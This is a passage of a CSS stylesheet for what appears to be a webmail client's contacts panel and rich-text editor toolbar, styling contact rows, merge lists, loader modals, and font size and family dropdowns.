            background: transparent;
            border: 0
        }

        .contactItem-delete:hover {
            opacity: 1;
            color: #cc9393
        }

        .contactItem-compose,
        .copy-button {
            position: absolute;
            left: -35px;
            top: 10px
        }

        .contactItem-compose {
            top: 1px;
            margin-left: -27px;
            height: 33px;
            background: #fff;
            color: #9397cd;
            border: 0;
            -webkit-box-shadow: -10px 0 20px -5px #fff;
            box-shadow: -10px 0 20px -5px #fff
        }

        .contactItem-compose:hover {
            color: #505061
        }

        .contactItem-add-inline,
        .contactItem-AddLabel,
        .contactItem-AddLabelIcon {
            height: 36px;
            line-height: 36px
        }

        .contactItem-AddLabelIcon {
            margin-left: 5px
        }

        .contactItem-AddLabelText {
            margin-left: .4rem;
            color: #505061;
            opacity: .8
        }

        .contactItem-add-inline {
            text-transform: uppercase;
            font-size: .8rem;
            cursor: pointer
        }

        .contactItem-add-inline>i {
            margin-right: 5px
        }

        .contactItem-actions>button {
            background: transparent;
            border: 0;
            padding: 0;
            color: #9397cd;
            margin-left: 5px
        }

        .contactItem-actions>button:hover {
            color: #505061
        }

        .contactItem-add {
            display: none
        }

        .contactItem-add,
        .contactItem-delete {
            height: 36px;
            padding: 5px;
            text-align: center
        }

        .contactItem-add:before,
        .contactItem-delete:before {
            display: block;
            width: 17px;
            height: 17px;
            content: " ";
            background: url(assets/img/plus.svg) no-repeat 50%
        }

        .contactItem-delete:before {
            background: url(assets/img/minus.svg) no-repeat 50%
        }

        .contactItem-row .as-sortable-item-handle:before {
            display: none
        }

        .contactItem-footer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            margin-top: 10px;
            padding: 0 50px
        }

        .contactItem-toggle-sort {
            background: transparent;
            border: 0;
            text-decoration: underline;
            color: #9397cd
        }

        .contactItem-toggle-sort>[class^=contactItem-toggle-] {
            display: none;
            pointer-events: none
        }

        .pm_modal .contactItem-compose {
            display: none
        }

        .contactItem-container .contactItem-row:last-of-type .contactItem-add {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactItem-container.as-sortable-disabled .contactItem-toggle-sort .contactItem-toggle-sort-enable,
        .contactItem-container:not(.as-sortable-disabled) .contactItem-toggle-sort .contactItem-toggle-sort-save {
            display: block
        }

        .contactItem-container:not(.as-sortable-disabled) .contactItem-row input {
            border-color: transparent;
            background: transparent
        }

        .contactItem-container:not(.as-sortable-disabled) .contactItem-row .contactItem-add,
        .contactItem-container:not(.as-sortable-disabled) .contactItem-row .contactItem-delete,
        .contactItem-container:not(.as-sortable-disabled) .contactItem-row .fa-chevron-down {
            display: none
        }

        .contactItem-container:not(.as-sortable-disabled) .contactItem-row .contactItem-sortable-wrapper {
            border-color: rgba(0, 0, 0, .2);
            cursor: move
        }

        .contactItem-container:not(.as-sortable-disabled) .contactItem-row .contactItem-sortable-wrapper:hover {
            border-color: #e3e4f2;
            -webkit-box-shadow: 0 0 4px #e3e4f2;
            box-shadow: 0 0 4px #e3e4f2
        }

        .contactItem-container:not(.as-sortable-disabled) .contactItem-row .contactItem-sortable-wrapper>* {
            pointer-events: none
        }

        .contactItem-container .contactItem-row:not(:first-of-type) .itemIcon {
            visibility: hidden
        }

        .contactDetails-container .as-sortable-placeholder {
            border-radius: 2px;
            margin-bottom: 2px;
            background: #e3e4f2
        }

        .contactItem-validation {
            min-width: 100%
        }

        .contactItem-validation p {
            margin: 0;
            font-size: .8em;
            padding: .5em
        }

        .appConfigBody-is-mobile .contactItem-sortable-wrapper {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .appConfigBody-is-mobile .contactItem-actions {
            width: auto
        }

        .appConfigBody-is-mobile .contactItem-label>input {
            width: 100%
        }

        .appConfigBody-is-mobile .contactItem-container .contactItem-row:not(:first-child) .contactItem-label>input {
            padding-left: 10px
        }

        .contactList-item-activeContact td {
            background: #828895
        }

        .contactList-item-activeContact td * {
            color: #fff
        }

        .contactList-item-delete {
            float: right;
            height: 100%;
            width: 40px;
            background: transparent;
            border: 0;
            color: #9397cd
        }

        .contactList-item-delete:hover {
            color: #cc9393
        }

        .contactList-item-activeContact .contactList-item-delete {
            color: inherit
        }

        .contactList-item-delete>*,
        .contactList-item-email>*,
        .contactList-item-name>* {
            pointer-events: none
        }

        .contactList-item .customCheckbox-container {
            border-left: 4px solid transparent
        }

        .contactList-item-activeCursorContact .customCheckbox-container {
            border-left-color: #9397cd
        }

        [class*=contactList-item-] span {
            pointer-events: none
        }

        .contactList-container .pm_table>* {
            cursor: pointer
        }

        .contactList-container .pm_table table {
            margin: 0
        }

        .contactList-container .pm_table thead th[data-action]:hover {
            background: #d9dfe8
        }

        .contactList-container .pm_table tbody .contactList-checkbox {
            height: 40px;
            width: 40px;
            padding: 0
        }

        .contactList-container .pm_table tbody span,
        .contactList-container .pm_table tbody ul {
            line-height: 50px;
            overflow: hidden;
            text-overflow: ellipsis;
            width: 100%;
            display: block
        }

        .contactList-container .pm_table tbody ul {
            list-style: none;
            margin: 0;
            padding: 0
        }

        .contactList-container .pm_table tbody ul li {
            display: inline
        }

        .contactList-container .pm_table tbody ul li:not(:last-of-type):after {
            content: ", "
        }

        .contactList-container .pm_table .contactArrowsSort-container {
            float: right
        }

        .contactNoResult-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            text-align: center;
            width: 100%;
            min-height: 100%;
            color: #acb0bf
        }

        .contactNoResult-container .contactNoResult-icon {
            font-size: 3rem;
            color: inherit
        }

        .contactNoResult-container .contactNoResult-title {
            font-size: 2rem;
            color: inherit;
            font-weight: 400;
            display: none
        }

        .contactNoResult-container .contactNoResult-icon,
        .contactNoResult-container .contactNoResult-title {
            margin-bottom: 10px
        }

        .contactNoResult-container .contactNoResult-text-block {
            display: block;
            margin-bottom: 1rem;
            margin-top: .5rem;
            color: inherit
        }

        .contacts-empty .contactNoResult-title-empty,
        .contacts-no-result .contactNoResult-title-no-result {
            display: block
        }

        .appConfigBody-is-mobile .contactNoResult {
            min-height: 80vh
        }

        .contactsToolbar-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            height: 56px;
            padding-right: 10px;
            border-bottom: 1px solid #acb0bf
        }

        .contactsToolbar-selectAll {
            margin: 0 20px 0 10px
        }

        .contactsToolbar-right {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            text-align: right
        }

        .contactsToolbar-container>button,
        .contactsToolbar-right>button {
            margin-right: 4px
        }

        .contactPlaceholder-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            text-align: center;
            color: #acb0bf
        }

        .contactPlaceholder-icon {
            font-size: 3rem
        }

        .contactPlaceholder-message {
            font-size: 1.4em
        }

        .contactDisplay-item-group {
            margin-bottom: 10px
        }

        .contactDisplay-item {
            padding: 10px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactDisplay-item>div {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .contactDisplay-item-value {
            display: block;
            width: 100%;
            word-wrap: break-word;
            max-width: 55%
        }

        .contactDisplay-item[data-key=adr] .contactDisplay-item-value {
            white-space: pre-wrap
        }

        .contactDisplay-item:not([data-key=photo]) .contactDisplay-item-image,
        .contactDisplay-item[data-key=photo] .contactDisplay-item-value {
            display: none
        }

        .contactDisplay-item-label {
            display: block;
            max-width: 45%;
            width: 100%;
            color: #6f6f6f
        }

        .contactDisplay-item-label .fa {
            width: 30px;
            text-align: center;
            color: #555
        }

        .contactDisplay-item-image {
            max-width: 65px;
            max-height: 65px
        }

        .contactDisplay-item[data-field=FN]:not(:first-child) {
            display: none
        }

        .contactMergerList-table {
            margin-top: 20px;
            position: relative
        }

        .contactMergerList-table .fa {
            pointer-events: none
        }

        .contactMergerList-table .undelete {
            display: none
        }

        .contactMergerList-table .delete,
        .contactMergerList-table .details,
        .contactMergerList-table .undelete {
            width: 40px;
            color: #9397cd;
            background: none;
            border: none
        }

        .contactMergerList-group {
            border: 1px solid #ccc;
            margin-bottom: 20px
        }

        .contactMergerList-group-footer {
            padding: 20px 0
        }

        .contactMergerList-group-preview {
            margin: 0 auto;
            display: block
        }

        .contactMergerList-item {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactMergerList-item>div {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            padding: 10px
        }

        .contactMergerList-item {
            border-bottom: 1px solid #ccc
        }

        .contactMergerList-item .contactMergerList-priority {
            text-align: center;
            max-width: 20px;
            color: #6f6f6f;
            border-right: 1px solid #ccc;
            margin-right: 10px
        }

        .contactMergerList-item .contactMergerList-actions {
            max-width: 100px
        }

        .contactMergerList-item.deleted .contactMergerList-priority .value,
        .contactMergerList-item:not(.included) .contactMergerList-priority .value {
            display: none
        }

        .contactMergerList-item.deleted {
            color: #ccc
        }

        .contactMergerList-item.deleted .checkbox,
        .contactMergerList-item.deleted .delete,
        .contactMergerList-item.deleted .details,
        .contactMergerList-item.deleted .preview {
            display: none
        }

        .contactMergerList-item.deleted .undelete {
            display: block
        }

        .contactMergerList-name .customCheckbox-container {
            margin-right: 6px
        }

        .contactMergerList-name .contactMergerList-name-span {
            text-overflow: ellipsis
        }

        .contactMergerList-name .customMaskInput-container {
            width: auto;
            vertical-align: middle
        }

        .contactMergerList-emails,
        .contactMergerList-name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .contactMergerList-name:not(.as-sortable-item-handle):before {
            content: "\F0C9";
            font-family: FontAwesome;
            margin-right: .5em;
            opacity: 0
        }

        .contactLoaderModal-label {
            display: block;
            text-align: center;
            text-transform: uppercase;
            font-size: .9em;
            font-style: italic;
            margin-bottom: 15px
        }

        .contactLoaderModal-error,
        .contactLoaderModal-success {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            margin-bottom: 20px
        }

        .contactLoaderModal-error h1,
        .contactLoaderModal-success h1 {
            font-size: 2em !important;
            color: #9397cd !important
        }

        .contactLoaderModal-frame {
            border: 1px solid #acb0bf;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            border-radius: 2px;
            padding: 20px 10px
        }

        .contactLoaderModal-logs {
            background-color: #f4f4f4;
            border: 1px solid #acb0bf;
            border-radius: 2px;
            font-family: monospace, monospace;
            list-style-type: none;
            margin: 0;
            max-height: 3em;
            overflow-y: scroll;
            padding: 10px 20px;
            width: 100%
        }

        .contactLoaderModal-log {
            line-height: 1.5em
        }

        .contactLoaderModal-container:not(.contactLoaderModal-imported) .contactLoaderModal-error,
        .contactLoaderModal-container:not(.contactLoaderModal-imported) .contactLoaderModal-success,
        .contactLoaderModal-imported .contactLoaderModal-info,
        .contactLoaderModal-imported .contactLoaderModal-label,
        .contactLoaderModal-imported .loader,
        .contactLoaderModal-imported .progressBar-container {
            display: none
        }

        .contactRightPanel-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            height: 100%
        }

        .contactRightPanel-container .loader {
            margin: auto
        }

        .contactRightPanel-container:not(.contactRightPanel-placeholder-hidden) .contactRightPanel-content,
        .contactRightPanel-placeholder-hidden .contactPlaceholder-container {
            display: none
        }

        .contactRightPanel-content {
            height: 100%
        }

        .squireToolbar-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            position: relative
        }

        .squireToolbar-container,
        .squireToolbar-container * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .squireToolbar-container.align-center .squireToolbar-action-acenter,
        .squireToolbar-container.align-left .squireToolbar-action-aleft,
        .squireToolbar-container.align-right .squireToolbar-action-aright,
        .squireToolbar-container.b .squireToolbar-action-bold,
        .squireToolbar-container.i .squireToolbar-action-italic,
        .squireToolbar-container.ol.li .squireToolbar-action-olist,
        .squireToolbar-container.open-image .squireToolbar-action-image,
        .squireToolbar-container.open-link .squireToolbar-action-link,
        .squireToolbar-container.u .squireToolbar-action-underline,
        .squireToolbar-container.ul.li .squireToolbar-action-ulist {
            background: rgba(0, 0, 0, .1);
            -webkit-box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .1)
        }

        [class*=squireToolbar-row] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 32px;
            background-color: #e6eaf0;
            border: 1px solid #acb0bf
        }

        [class*=squireToolbar-row] .squireToolbar-action-mode:active,
        [class*=squireToolbar-row] .squireToolbar-action-mode:hover,
        [class*=squireToolbar-row] [class*=squireToolbar-action-]:active,
        [class*=squireToolbar-row] [class*=squireToolbar-action-]:hover {
            background: #fff;
            border: 1px solid #acb0bf
        }

        [class*=squireToolbar-row] [class*=squireToolbar-action-]:hover:not(:active) {
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1)
        }

        [class*=squireToolbar-row] [class*=squireToolbar-action-]:active {
            -webkit-box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .1)
        }

        .squireToolbar-row-1 {
            border-width: 0 0 1px;
            z-index: 1999
        }

        .squireToolbar-row-2 {
            display: none;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            width: 100%;
            z-index: 1998;
            border-width: 0 0 1px
        }

        .squire-container[data-editor-mode="text/plain"] .squireToolbar-row-2 {
            display: none
        }

        .squire-container[data-editor-mode="text/plain"] .squireToolbar-row-1>:not(.squireToolbar-text-mode) {
            display: none;
            pointer-events: none
        }

        .squire-container[data-editor-mode="text/plain"] .squireToolbar-row-1 {
            position: relative;
            top: 0;
            width: 100%;
            border-radius: 0;
            border-width: 0 0 1px;
            -webkit-box-shadow: none;
            box-shadow: none;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .squire-container[data-editor-mode="text/plain"] .squireToolbar-text-mode {
            margin-left: 0
        }

        .squire-container[data-editor-mode="text/plain"] .squireToolbar-select-list {
            left: auto;
            right: 4px
        }

        .squireToolbar-action-color {
            position: relative
        }

        .squireToolbar-action-color>* {
            pointer-events: none
        }

        .squireToolbar-action-color .fa-font {
            position: relative;
            top: -3px
        }

        .squireToolbar-action-color mark {
            position: absolute;
            width: 16px;
            height: 3px;
            color: #222;
            background: currentColor;
            bottom: 3px;
            left: 6px
        }

        .moreToggle-container.squireDropdown-is-open .fa-caret-down,
        .squireSelectColor-is-open .squireToolbar-action-color .fa-angle-down,
        .squireSelectFontFamily-container.squireDropdown-is-open .fa-angle-down,
        .squireSelectFontSize-container.squireDropdown-is-open .fa-angle-down {
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg)
        }

        .squireToolbar-show-subrow .squireToolbar-action-color {
            border: 1px solid #acb0bf;
            margin-right: 4px
        }

        .squireToolbar-show-subrow .squireToolbar-action-options {
            background: #fff;
            border: 1px solid #acb0bf
        }

        .squireToolbar-show-subrow .squireToolbar-row-2 {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .colorPopover-container:not(.colorPopover-hidden)+.squireToolbar-action-color .fa-angle-down,
        .squireToolbar-show-subrow .squireToolbar-action-options .fa-angle-down {
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg)
        }

        .colorPopover-container:not(.colorPopover-hidden)+.squireToolbar-action-color {
            background: #fff;
            border: 1px solid #acb0bf
        }

        .squireToolbar-separator {
            width: 1px;
            height: 32px;
            background: #acb0bf
        }

        [class*=squireToolbar-action-] {
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            border: 0;
            padding: 0;
            background: transparent;
            width: 36px;
            height: 26px;
            margin: 4px;
            overflow: hidden;
            text-overflow: ellipsis;
            word-wrap: break-word;
            white-space: nowrap;
            border-radius: 2px
        }

        [name=signature] [class*=squireToolbar-action-] {
            margin: 2px;
            width: 28px;
            font-size: .8em
        }

        [name=signature] .squireToolbar-action-color mark {
            left: 2px;
            bottom: 4px;
            width: 12px
        }

        [class*=squireToolbar-action-] i {
            pointer-events: none
        }

        .squireToolbar-action-color {
            width: 42px;
            background-color: #fff
        }

        .squire-popover {
            position: absolute;
            z-index: 1005;
            background: #fff;
            border: 1px solid #acb0bf;
            white-space: nowrap;
            right: 10px !important;
            padding: 0;
            top: 2.3rem;
            text-align: right;
            display: block
        }

        .squire-popover.squire-popover-second {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            right: auto !important;
            border-radius: 2px;
            -webkit-box-shadow: 0 2px 10px rgba(0, 0, 0, .1);
            box-shadow: 0 2px 10px rgba(0, 0, 0, .1)
        }

        .squire-popover[class*=hidden] {
            display: none;
            pointer-events: none
        }

        .squire-popover,
        .squire-popover * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .squire-popover input,
        .squire-popover input[type=text] {
            line-height: 2em;
            border: 1px solid #e1e1ef;
            color: #222;
            border-radius: 2px;
            position: relative;
            resize: none;
            margin-bottom: .8em;
            padding: 0 1em
        }

        .squire-popover [class*=-panel] {
            padding: .5rem;
            border: 0;
            margin: 0 !important
        }

        .squire-popover [class*=-label] {
            padding-right: 0
        }

        .squire-popover [class*=-input] {
            width: 62%;
            margin-left: auto
        }

        .squire-popover [class*=-field] {
            padding: 0 !important;
            border: 0 !important
        }

        .squire-popover [class*=-legend] {
            display: none !important
        }

        .squire-popover [class*=-footer] [class*=-btn-] {
            text-decoration: none;
            border: 1px solid #acb0bf;
            border-radius: 2px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            display: inline-block;
            cursor: pointer;
            -webkit-transition: background-color .25s linear, border-color .25s linear;
            transition: background-color .25s linear, border-color .25s linear;
            background-color: #9397cd;
            border-color: #9397cd;
            color: #fff;
            margin: 0
        }

        .squireToolbar-color {
            position: relative
        }

        .squireToolbar-select {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            position: relative;
            min-height: 32px;
            min-width: 50px
        }

        .squireToolbar-select-list {
            position: absolute;
            z-index: 1005;
            background: #fff;
            border: 1px solid #acb0bf;
            white-space: nowrap;
            top: 2.2rem;
            left: 0;
            right: auto;
            min-width: 100%;
            min-height: 9em;
            max-height: 50%;
            overflow-y: auto;
            margin: 0;
            padding: 0;
            list-style: none;
            border-radius: 2px;
            -webkit-box-shadow: 0 2px 2px rgba(0, 0, 0, .1);
            box-shadow: 0 2px 2px rgba(0, 0, 0, .1)
        }

        .squireToolbar-editor-mode {
            max-height: inherit
        }

        .squireToolbar-select:not(.squireDropdown-is-open) .squireToolbar-select-list {
            display: none
        }

        .squireToolbar-select-view {
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            background-color: #fff;
            margin: 4px 0 4px 4px;
            height: 26px;
            border: 1px solid #acb0bf;
            border-radius: 2px
        }

        .squireToolbar-select-view,
        .squireToolbar-select-view button {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .squireToolbar-select-view button {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            width: 100%;
            height: 100%;
            text-align: left;
            margin: 0;
            padding: 0 .5em
        }

        .squireToolbar-select-view .value {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            width: 100%;
            text-align: left;
            margin: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            word-wrap: break-word;
            white-space: nowrap
        }

        .squireToolbar-select-view .value:after {
            content: "";
            display: block;
            height: 100%;
            width: 20px;
            position: absolute;
            right: 0;
            top: 0
        }

        .squireToolbar-select-view .value:first-letter {
            text-transform: uppercase
        }

        [class*=squireToolbar-row] .squireToolbar-select-view button:active,
        [class*=squireToolbar-row] .squireToolbar-select-view button:hover,
        [class*=squireToolbar-row] .squireToolbar-select-view button:hover:not(:active) {
            background: inherit;
            -webkit-box-shadow: none;
            box-shadow: none;
            border: 0
        }

        .squire-container[data-editor-mode="text/plain"] .squireToolbar-dropdown-divider {
            display: none
        }

        .squireToolbar-dropdown-divider {
            height: 1px;
            margin: 4px 0;
            background-color: #acb0bf
        }

        .squireToolbar-select-item {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            cursor: default;
            padding: 0 .5rem;
            border-top: 1px dotted #e6e7eb;
            line-height: 32px;
            list-style-image: url(data:0);
            list-style: none
        }

        .squireToolbar-select-item * {
            pointer-events: none
        }

        .squireToolbar-select-item span {
            margin-left: .5em
        }

        .squireToolbar-dropdown-divider+.squireToolbar-select-item,
        .squireToolbar-select-item:first-child {
            border: 0
        }

        .squireToolbar-select-item:hover {
            background: #e6e7eb
        }

        .squireToolbar-select-item[data-value="10"] {
            font-size: 10px
        }

        [data-font-size="10"] .squireToolbar-select-item[data-value="10"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="12"] {
            font-size: 12px
        }

        [data-font-size="12"] .squireToolbar-select-item[data-value="12"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="14"] {
            font-size: 14px
        }

        [data-font-size="14"] .squireToolbar-select-item[data-value="14"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="16"] {
            font-size: 16px
        }

        [data-font-size="16"] .squireToolbar-select-item[data-value="16"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="18"] {
            font-size: 18px
        }

        [data-font-size="18"] .squireToolbar-select-item[data-value="18"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="20"] {
            font-size: 20px
        }

        [data-font-size="20"] .squireToolbar-select-item[data-value="20"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="22"] {
            font-size: 22px
        }

        [data-font-size="22"] .squireToolbar-select-item[data-value="22"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="24"] {
            font-size: 24px
        }

        [data-font-size="24"] .squireToolbar-select-item[data-value="24"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value="26"] {
            font-size: 26px
        }

        [data-font-size="26"] .squireToolbar-select-item[data-value="26"] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=georgia] {
            font-family: georgia
        }

        [data-font-family^=georgia] .squireToolbar-select-item[data-value^=georgia] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=arial] {
            font-family: arial
        }

        [data-font-family^=arial] .squireToolbar-select-item[data-value^=arial] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=helvetica] {
            font-family: helvetica
        }

        [data-font-family^=helvetica] .squireToolbar-select-item[data-value^=helvetica] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=menlo] {
            font-family: menlo
        }

        [data-font-family^=menlo] .squireToolbar-select-item[data-value^=menlo] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=tahoma] {
            font-family: tahoma
        }

        [data-font-family^=tahoma] .squireToolbar-select-item[data-value^=tahoma] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=verdana] {
            font-family: verdana
        }

        [data-font-family^=verdana] .squireToolbar-select-item[data-value^=verdana] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=times] {
            font-family: times
        }

        [data-font-family^=times] .squireToolbar-select-item[data-value^=times] {
            background: #d7d9e0
        }

        .squireToolbar-select-item[data-value^=trebuchet] {
            font-family: trebuchet
        }

        [data-font-family^=trebuchet] .squireToolbar-select-item[data-value^=trebuchet] {
            background: #d7d9e0
        }

        .squireToolbar-text-mode {
            min-width: auto;
            margin-left: auto;
            margin-right: .5em
        }

        .squireToolbar-text-mode .squireToolbar-select-list {
            min-height: 5em;
            right: 0;
            left: auto
        }

        .squireToolbar-text-mode .squireToolbar-action-mode {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            padding-left: 0;
            padding-right: 0;
            background: inherit;
            -webkit-box-shadow: none;
            box-shadow: none;
            border-color: transparent;
            -webkit-transition: background, border .2s ease-out;
            transition: background, border .2s ease-out
        }

        .squireToolbar-action-mode .squireDropdown-item-label {
            position: absolute;
            left: 0;
            opacity: 0
        }

        .squireToolbar-compose-icon {
            pointer-events: none
        }

        .appConfigBody-is-mobile .squireToolbar-fontSize {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .appConfigBody-is-mobile [class*=squireToolbar-action-]+.squireToolbar-separator {
            border: 0
        }

        .appConfigBody-is-mobile .squireToolbar-container {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            height: auto
        }

        .appConfigBody-is-mobile .squireToolbar-action-options {
            display: none
        }

        .squireToolbar-dropdown-container {
            position: relative
        }

        .squireToolbar-dropdown {
            border-color: #acb0bf;
            -webkit-box-shadow: none;
            box-shadow: none;
            background: #f0f0f0;
            z-index: 999;
            margin: 0;
            width: auto
        }

        .squire-container[data-editor-mode="text/html"] .squireToolbar-select-view .plain-text-icon,
        .squire-container[data-editor-mode="text/plain"] .squireToolbar-select-view .fa-file-text {
            display: none !important
        }

        .squireToolbar-editor-mode .fa-file-text {
            margin-right: 3px
        }

        .squireToolbar-select-item .fa-check {
            opacity: 0
        }

        .squire-container[data-editor-mode="text/html"] .squireToolbar-select-item[data-value="text/html"],
        .squire-container[data-editor-mode="text/plain"] .squireToolbar-select-item[data-value="text/plain"],
        .squireToolbar-container.dir-ltr .squireToolbar-select-item[data-squire-actions=setTextDirectionLTR],
        .squireToolbar-container.dir-rtl .squireToolbar-select-item[data-squire-actions=setTextDirectionRTL] {
            pointer-events: none
        }

        .squire-container[data-editor-mode="text/html"] .squireToolbar-select-item[data-value="text/html"] .fa-check,
        .squire-container[data-editor-mode="text/plain"] .squireToolbar-select-item[data-value="text/plain"] .fa-check,
        .squireToolbar-container.dir-ltr .squireToolbar-select-item[data-squire-actions=setTextDirectionLTR] .fa-check,
        .squireToolbar-container.dir-rtl .squireToolbar-select-item[data-squire-actions=setTextDirectionRTL] .fa-check {
            opacity: 1
        }

        .squire-container[data-editor-mode="text/plain"] .squireToolbar-select-item[data-squire-actions=setTextDirectionLTR],
        .squire-container[data-editor-mode="text/plain"] .squireToolbar-select-item[data-squire-actions=setTextDirectionRTL] {
            display: none
        }

        .squireToolbar-action-options {
            position: relative;
            overflow: visible
        }

        .squireToolbar-triangle-with-shadow {
            position: absolute;
            left: calc(50% - 51px);
            bottom: -8px;
            width: 100px;
            height: 100px;
            overflow: hidden;
            -webkit-transform: scale(.22);
            transform: scale(.22);
            -webkit-transform-origin: bottom center;
            transform-origin: bottom center;
            opacity: 0
        }

        .squireToolbar-triangle-with-shadow:after {
            content: "";
            position: absolute;
            width: 50px;
            height: 50px;
            background: #e6eaf0;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
            top: 75px;
